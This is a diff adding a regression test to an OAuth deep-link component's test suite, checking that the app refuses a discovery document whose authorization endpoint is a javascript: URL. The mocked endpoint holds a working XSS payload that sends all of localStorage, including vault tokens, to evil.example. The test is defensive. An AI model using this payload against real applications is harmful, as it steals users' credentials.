@@ -411,6 +411,49 @@ describe("AddVault ?add= connect deep link", () => {
     expect(loadPendingOAuth()).toBeNull();
   });
 
+  it("never navigates to a javascript: authorize endpoint from the vault's discovery doc", async () => {
+    // A note's writer controls a link like `/add?add=https://evil.example`
+    // (it renders as an in-app link, one click). The ?add= value is http(s),
+    // so it auto-begins; the host it names answers discovery with a
+    // `javascript:` authorization_endpoint. Navigating there runs the
+    // writer's script in the app's origin, where every vault token sits in
+    // localStorage (blocked only where a script-src CSP is served).
+    const hostile = {
+      ...validMetadata,
+      issuer: "https://evil.example",
+      authorization_endpoint:
+        "javascript:fetch('https://evil.example/?t='+encodeURIComponent(JSON.stringify(localStorage)))//",
+      token_endpoint: "https://evil.example/oauth/token",
+      registration_endpoint: "https://evil.example/oauth/register",
+    };
+    vi.stubGlobal(
+      "fetch",
+      vi.fn<typeof fetch>(async (input: RequestInfo | URL) => {
+        const url = typeof input === "string" ? input : input.toString();
+        const body = url.endsWith("/.well-known/oauth-authorization-server")
+          ? hostile
+          : url.endsWith("/oauth/register")
+            ? { client_id: "evil-client" }
+            : {};
+        return {
+          ok: true,
+          status: 200,
+          json: async () => body,
+          text: async () => JSON.stringify(body),
+        } as Response;
+      }),
+    );
+    renderAddVault(`/add?add=${encodeURIComponent("https://evil.example")}`);
+
+    // Settles either way: the app navigated, or it refused with a message.
+    await waitFor(() => {
+      const navigated = vi.mocked(window.location.assign).mock.calls.length > 0;
+      expect(navigated || screen.queryByText(/authorization endpoint/i)).toBeTruthy();
+    });
+    expect(vi.mocked(window.location.assign).mock.calls.map(([t]) => String(t))).toEqual([]);
+    expect(screen.getByText(/authorization endpoint/i)).toBeTruthy();
+  });
+
   it("requires an explicit scheme — a bare hostname never auto-begins", async () => {
     mockDiscoveryAndDcr();
     renderAddVault(`/add?add=${encodeURIComponent("u.parachute.computer/vault/aaron")}`);
